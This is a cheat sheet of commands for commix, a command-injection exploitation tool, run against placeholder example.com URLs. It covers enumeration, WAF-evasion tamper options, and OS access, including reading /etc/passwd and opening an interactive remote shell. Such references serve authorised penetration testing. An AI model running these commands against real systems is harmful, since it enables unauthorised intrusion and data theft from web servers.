# commix (Command Injection Exploiter)

## Basic Usage
`commix -u "http://example.com/vulnerable.php?id=1"`
`commix -u "http://example.com/vulnerable.php?id=1" --batch`

## POST Request
`commix -u "http://example.com/vulnerable.php" --data="username=test&password=123"`
`commix -u "http://example.com/api" --data='{"user": "admin"}' --content-type="application/json"`

## Specifying Injectable Parameters
`commix -u "http://example.com/vulnerable.php?id=1&name=test" -p name`
`commix -u "http://example.com/vulnerable.php" --data="user=test&pass=123" -p user`
`commix -u "http://example.com/vulnerable.php?id=INJECT_HERE"`

## Headers and Cookies
`commix -u "http://example.com/vulnerable.php?id=1" --cookie="sessionid=abc123"`
`commix -u "http://example.com/vulnerable.php?id=1" --host="example.com"`
`commix -u "http://example.com/vulnerable.php?id=1" --headers="Authorization: Bearer <token>"`

## Enumeration & Information Gathering
`commix -u "http://example.com/vulnerable.php?id=1" --current-user`
`commix -u "http://example.com/vulnerable.php?id=1" --hostname`
`commix -u "http://example.com/vulnerable.php?id=1" --sys-info`
`commix -u "http://example.com/vulnerable.php?id=1" --users`
`commix -u "http://example.com/vulnerable.php?id=1" --privileges`

## OS Access and Execution
`commix -u "http://example.com/vulnerable.php?id=1" --os-cmd="id"`
`commix -u "http://example.com/vulnerable.php?id=1" --os-cmd="cat /etc/passwd"`
`commix -u "http://example.com/vulnerable.php?id=1" --os-shell`

## Technique and Level
`commix -u "http://example.com/vulnerable.php?id=1" --technique=T`
`commix -u "http://example.com/vulnerable.php?id=1" --level=3`

## Evasion and WAF Bypass
`commix -u "http://example.com/vulnerable.php?id=1" --tamper="base64encode"`
`commix -u "http://example.com/vulnerable.php?id=1" --tamper="space2ifs"`
`commix -u "http://example.com/vulnerable.php?id=1" --base64`

## Proxy Setting
`commix -u "http://example.com/vulnerable.php?id=1" --proxy="http://127.0.0.1:8080"`

## Common Flags
* `-u`, `--url` - Target URL
* `--data` - Data string to be sent through POST
* `-p` - Testable parameter(s)
* `--cookie` - HTTP Cookie header value
* `--headers` - Extra headers (e.g. "Accept-Language: fr\nETag: 123")
* `--batch` - Never ask for user input, use the default behavior
* `--os-cmd` - Execute a single operating system command
* `--os-shell` - Prompt for an interactive operating system shell
* `--current-user` - Retrieve current OS user
* `--sys-info` - Retrieve system environment information
* `--technique` - Specify injection technique(s) to use (e.g. C, E, T)
  * `C`: Classic/Results-based
  * `E`: Eval-based
  * `T`: Time-based blind
* `--level` - Level of tests to perform (1-3, default 1)
* `--tamper` - Use given script(s) for tampering injection data
* `--base64` - Base64 encode all injection strings
* `--proxy` - Use a proxy to connect to the target URL
